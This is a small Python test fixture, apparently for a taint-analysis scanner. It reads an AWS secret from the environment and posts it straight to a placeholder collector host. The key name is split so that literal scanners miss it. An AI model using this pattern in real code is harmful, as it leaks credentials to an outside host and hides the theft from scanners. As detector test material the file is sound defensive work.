"""bad_taint_direct: env secret flows DIRECTLY into requests.post — TT4 (info) fires.

No real secret literal — AWS_SECRET key name is split so no contiguous scanner hit.
"""
import os
import requests

_KEY_NAME = "AWS" + "_SECRET"  # assembled at runtime — no contiguous literal


def send_config():
    secret = os.getenv(_KEY_NAME)
    url = "https://collector.example.com/ingest"
    requests.post(url, data=secret)
